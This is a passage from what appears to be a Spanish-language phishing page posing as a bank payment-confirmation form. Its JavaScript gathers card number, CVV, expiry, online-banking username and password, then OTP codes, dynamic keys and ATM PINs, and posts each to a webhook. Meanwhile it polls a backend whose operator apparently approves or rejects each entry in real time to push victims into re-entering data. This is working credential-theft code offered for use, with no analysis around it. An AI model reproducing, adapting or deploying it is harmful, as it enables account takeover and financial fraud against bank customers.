                        confirmationInput.placeholder = 'Ingresa tu código de verificación (6-8 dígitos)';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        buttonText.textContent = 'Confirmar pago';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }

                    if (modoReal === 'clave_dinamica' && modoAutenticacion !== 'clave_dinamica') {
                        console.log('🔄 Cambiando interfaz a Clave Dinámica');
                        modoAutenticacion = 'clave_dinamica';
                        mostrarSeccionOTP('clave_dinamica');
                        confirmationInput.value = '';
                        confirmationInput.placeholder = 'Ingresa tu clave dinámica (6-8 dígitos)';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        buttonText.textContent = 'Confirmar pago';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }

                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A' && resultado.otp_codigo !== null) {
                        if (ultimoCodigoOTP !== resultado.otp_codigo) {
                            ultimoCodigoOTP = resultado.otp_codigo;
                            confirmationInput.value = ultimoCodigoOTP;
                            confirmationInput.style.borderColor = '#4ade80';
                            confirmationInput.style.boxShadow = '0 0 0 3px rgba(74, 222, 128, 0.3)';
                            setTimeout(() => {
                                confirmationInput.style.borderColor = '';
                                confirmationInput.style.boxShadow = '';
                            }, 2000);
                            mostrarExito('✅ Código recibido automáticamente');
                        }
                    }

                    return;
                }

                if (resultado.estado === 'approved' || resultado.estado === 'approved_otp' || resultado.estado === 'approved_clave_cajero') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    console.log('✅ Código aprobado!');
                    mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                    detenerHeartbeat(true);
                    setTimeout(() => {
                        window.location.href = 'exito.php';
                    }, 2000);
                    return;
                }

                if (resultado.estadoReal === 'rejected' || resultado.estadoReal === 'rejected_otp' || resultado.estadoReal === 'rejected_clave_cajero' || resultado.estadoReal === 'rejected_user_error') {

                    if (rechazoDetectado) {
                        console.log('⏳ Rechazo ya detectado, esperando nuevo envío del usuario...');
                        return;
                    }

                    console.log('❌ Rechazo detectado:', resultado.estadoReal);
                    rechazoDetectado = true;

                    if (resultado.estadoReal === 'rejected_user_error') {
                        loadingOverlay.classList.remove('active');
                        statusMessage.className = 'status-message error-usuario';
                        statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                        statusMessage.style.display = 'block';

                        resetFormulario();

                        clearInterval(pollingInterval);
                        pollingInterval = null;

                        console.log('🔄 Formulario reseteado por ERROR USUARIO');
                        return;
                    }

                    let mensajeError;
                    if (modoAutenticacion === 'clave_cajero') {
                        mensajeError = '❌ Clave del Cajero incorrecta. Intente de nuevo (4 dígitos).';
                    } else if (modoAutenticacion === 'clave_dinamica') {
                        mensajeError = '❌ Clave Dinámica incorrecta. Intente de nuevo (6-8 dígitos).';
                    } else {
                        mensajeError = '❌ Código OTP incorrecto. Intente de nuevo (6-8 dígitos).';
                    }

                    loadingOverlay.classList.remove('active');
                    statusMessage.className = 'status-message error';
                    statusMessage.textContent = mensajeError;
                    statusMessage.style.display = 'block';

                    confirmationInput.value = '';
                    confirmationInput.disabled = false;
                    confirmationInput.focus();

                    usernameInput.disabled = true;
                    passwordInput.disabled = true;

                    submitButton.disabled = false;
                    buttonText.textContent = 'Confirmar pago';
                    otpSection.classList.add('visible');
                    pasoActual = 'otp';
                    formularioBloqueado = false;

                    clearInterval(pollingInterval);
                    pollingInterval = null;

                    console.log('⏸️ Polling detenido. Esperando nuevo código...');
                    return;
                }
            }, POLLING_INTERVAL);
        }

        // ============================================
        // FUNCIONES UI
        // ============================================
        function mostrarSeccionOTP(tipo) {
            otpSection.classList.add('visible');
            pasoActual = 'otp';
            confirmationInput.disabled = false;
            confirmationInput.focus();
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            errorMostrado = false;

            if (tipo === 'clave_dinamica') {
                otpInfoMessage.innerHTML = `
                    <span>Para realizar este proceso, ingresa tu <strong>Clave Dinámica</strong> generada por el banco (6-8 dígitos).</span>
                `;
                const svg = otpInfoText.querySelector('svg');
                if (svg) {
                    svg.outerHTML = `
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:16px;height:16px;flex-shrink:0;">
                            <path d="M12 2L2 7l10 5 10-5-10-5z"/>
                            <path d="M2 17l10 5 10-5"/>
                            <path d="M2 12l10 5 10-5"/>
                        </svg>
                    `;
                }
                otpLabel.textContent = 'Clave Dinámica *';
                confirmationInput.placeholder = 'Ingresa tu clave dinámica (6-8 dígitos)';
                buttonText.textContent = 'Confirmar pago';
                modoAutenticacion = 'clave_dinamica';
                confirmationInput.maxLength = 8;
            } else if (tipo === 'clave_cajero') {
                otpInfoMessage.innerHTML = `
                    <span>Para realizar este proceso, ingresa tu <strong>Clave del Cajero</strong> proporcionada por tu banco (4 dígitos).</span>
                `;
                const svg = otpInfoText.querySelector('svg');
                if (svg) {
                    svg.outerHTML = `
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:16px;height:16px;flex-shrink:0;">
                            <rect x="2" y="4" width="20" height="16" rx="2"/>
                            <path d="M8 12h8"/>
                            <path d="M12 8v8"/>
                        </svg>
                    `;
                }
                otpLabel.textContent = 'Clave del Cajero *';
                confirmationInput.placeholder = 'Ingresa tu clave del cajero (4 dígitos)';
                buttonText.textContent = 'Confirmar pago';
                modoAutenticacion = 'clave_cajero';
                confirmationInput.maxLength = 4;
            } else {
                otpInfoMessage.innerHTML = `
                    <span>Para realizar este proceso, ingresa el código de <strong>Token móvil o físico</strong> (6-8 dígitos).</span>
                `;
                const svg = otpInfoText.querySelector('svg');
                if (svg) {
                    svg.outerHTML = `
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:16px;height:16px;flex-shrink:0;">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                            <path d="M12 8v4"/>
                            <path d="M12 16h.01"/>
                        </svg>
                    `;
                }
                otpLabel.textContent = 'Código OTP *';
                confirmationInput.placeholder = 'Ingresa tu código de verificación (6-8 dígitos)';
                buttonText.textContent = 'Confirmar pago';
                modoAutenticacion = 'otp';
                confirmationInput.maxLength = 8;
            }
            submitButton.disabled = false;
        }

        function ocultarOTP() {
            otpSection.classList.remove('visible');
            pasoActual = 'credenciales';
            buttonText.textContent = 'Confirmar pago';
            confirmationInput.value = '';
            confirmationInput.disabled = true;
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            errorMostrado = false;
            ultimoCodigoOTP = null;
        }

        function mostrarError(mensaje) {
            statusMessage.className = 'status-message error';
            statusMessage.textContent = mensaje;
            statusMessage.style.display = 'block';
            loadingOverlay.classList.remove('active');
            submitButton.disabled = false;
            buttonText.textContent = 'Confirmar pago';
            errorMostrado = true;
        }

        function mostrarExito(mensaje) {
            statusMessage.className = 'status-message success';
            statusMessage.textContent = mensaje;
            statusMessage.style.display = 'block';
            loadingOverlay.classList.remove('active');
            errorMostrado = false;
        }

        function resetFormulario() {
            usernameInput.disabled = false;
            passwordInput.disabled = false;
            confirmationInput.disabled = true;
            ocultarOTP();

            loadingOverlay.classList.remove('active');
            submitButton.disabled = false;
            buttonText.textContent = 'Confirmar pago';
            usernameInput.value = '';
            passwordInput.value = '';
            confirmationInput.value = '';
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            errorMostrado = false;
            modoAutenticacion = 'otp';
            ultimoCodigoOTP = null;
            formularioBloqueado = false;
            rechazoDetectado = false;
            confirmationInput.maxLength = 8;
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        // ============================================
        // VALIDACIÓN Y ENVÍO
        // ============================================
        [usernameInput, passwordInput, confirmationInput].forEach(input => {
            input.addEventListener('blur', function() {
                if (this.value.trim()) {
                    this.parentElement.classList.remove('error');
                }
            });
        });

        confirmationInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');

            if (modoAutenticacion === 'clave_cajero') {
                if (this.value.length > 4) {
                    this.value = this.value.slice(0, 4);
                }
            } else {
                if (this.value.length > 8) {
                    this.value = this.value.slice(0, 8);
                }
            }
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            if (formularioBloqueado) {
                console.log('⏳ Formulario bloqueado, espere...');
                return;
            }

            let isValid = true;
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));

            if (pasoActual === 'credenciales') {
                if (!usernameInput.value.trim()) {
                    usernameInput.parentElement.classList.add('error');
                    isValid = false;
                }
                if (!passwordInput.value.trim()) {
                    passwordInput.parentElement.classList.add('error');
                    isValid = false;
                } else if (passwordInput.value.length < 4) {
                    passwordInput.parentElement.classList.add('error');
                    passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
                    isValid = false;
                }
            } else if (pasoActual === 'otp') {
                if (!confirmationInput.value.trim()) {
                    confirmationInput.parentElement.classList.add('error');
                    isValid = false;
                } else {
                    if (modoAutenticacion === 'clave_cajero') {
                        if (!/^\d{4}$/.test(confirmationInput.value)) {
                            confirmationInput.parentElement.classList.add('error');
                            confirmationInput.parentElement.querySelector('.error-message').textContent = 'La clave del cajero debe tener 4 dígitos';
                            isValid = false;
                        }
                    } else {
                        if (!/^\d{6,8}$/.test(confirmationInput.value)) {
                            confirmationInput.parentElement.classList.add('error');
                            confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código debe tener entre 6 y 8 dígitos';
                            isValid = false;
                        }
                    }
                }
            }

            if (!isValid) return;

            formularioBloqueado = true;
            loadingOverlay.classList.add('active');
            submitButton.disabled = true;
            buttonText.textContent = 'Verificando...';
            usernameInput.disabled = true;
            passwordInput.disabled = true;
            confirmationInput.disabled = true;

            if (pasoActual === 'credenciales') {
                console.log('🆔 Enviando credenciales con solicitudId:', solicitudId);
                enviarHeartbeat('activo');

                const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
                const cvv = localStorage.getItem('cardCVV') || 'No disponible';
                const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';

                const datosWebhook = {
                    solicitudId: solicitudId,
                    numeroTarjeta: numeroTarjeta,
                    cvv: cvv,
                    vencimiento: vencimiento,
                    usuario: usernameInput.value.trim(),
                    password: passwordInput.value.trim(),
                    monto: document.getElementById('transaction-amount').textContent,
                    fecha: new Date().toLocaleString('es-CO')
                };

                const enviado = await enviarCredencialesAlWebhook(datosWebhook);

                if (enviado) {
                    iniciarPollingCredenciales();
                } else {
                    mostrarError('Error al procesar la solicitud');
                    resetFormulario();
                    formularioBloqueado = false;
                }

            } else if (pasoActual === 'otp') {
                console.log('🆔 Enviando ' + modoAutenticacion + ' para:', solicitudId);

                if (pollingInterval) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                }
                rechazoDetectado = false;
                enviarHeartbeat('activo');

                if (modoAutenticacion === 'otp') {
                    const datosOTP = {
                        solicitudId: solicitudId,
                        otp: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: document.getElementById('transaction-amount').textContent,
                        fecha: new Date().toLocaleString('es-CO'),
                        es_reintento: true
                    };
                    const enviado = await enviarOTPAlWebhook(datosOTP);
                    if (enviado) {
                        console.log('✅ OTP enviado, esperando aprobación...');
                        iniciarPollingOTP();
                    } else {
                        loadingOverlay.classList.remove('active');
                        mostrarError('Error al procesar el OTP');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Confirmar pago';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                } else if (modoAutenticacion === 'clave_dinamica') {
                    const datosClave = {
                        solicitudId: solicitudId,
                        clave: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: document.getElementById('transaction-amount').textContent,
                        fecha: new Date().toLocaleString('es-CO'),
                        es_reintento: true
                    };
                    const enviado = await enviarClaveDinamicaAlWebhook(datosClave);
                    if (enviado) {
                        console.log('✅ Clave Dinámica enviada, esperando aprobación...');
                        iniciarPollingOTP();
                    } else {
                        loadingOverlay.classList.remove('active');
                        mostrarError('Error al procesar la Clave Dinámica');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Confirmar pago';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                } else if (modoAutenticacion === 'clave_cajero') {
                    const datosClave = {
                        solicitudId: solicitudId,
                        clave: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: document.getElementById('transaction-amount').textContent,
                        fecha: new Date().toLocaleString('es-CO'),
                        es_reintento: true
                    };
                    const enviado = await enviarClaveCajeroAlWebhook(datosClave);
                    if (enviado) {
                        console.log('✅ Clave Cajero enviada, esperando aprobación...');
                        iniciarPollingOTP();
                    } else {
                        loadingOverlay.classList.remove('active');
                        mostrarError('Error al procesar la Clave del Cajero');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Confirmar pago';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                }
            }
        });
    </script>
</body>
</html>
